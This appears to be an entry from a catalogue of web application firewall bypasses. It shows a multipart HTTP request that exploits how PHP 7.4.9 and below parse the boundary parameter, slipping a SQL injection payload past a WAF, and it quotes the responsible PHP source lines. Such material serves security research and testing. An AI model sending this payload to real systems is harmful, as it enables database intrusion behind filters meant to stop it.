### PHP 7.4.9 and below
**Incorrect boundary parsing**
```http
POST / HTTP/1.1
Host: localhost
Content-Type: multipart/form-data; PHPboundaryPHP=phpboundary; boundary=wafboundary
Content-Length: 219

--wafboundary
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

--phpboundary
Content-Disposition: form-data; name="q"

' union select '1
--phpboundary--
--wafboundary--
```

**Source code** ([/php/php-src/main/rfc1867.c](https://github.com/php/php-src/blob/4514afc1875bedf4dc07cb457f8ef5c986a7ca55/main/rfc1867.c#L711-L725))
```c
boundary = strstr(content_type_dup, "boundary");
...
if (!boundary || !(boundary = strchr(boundary, '='))) {
```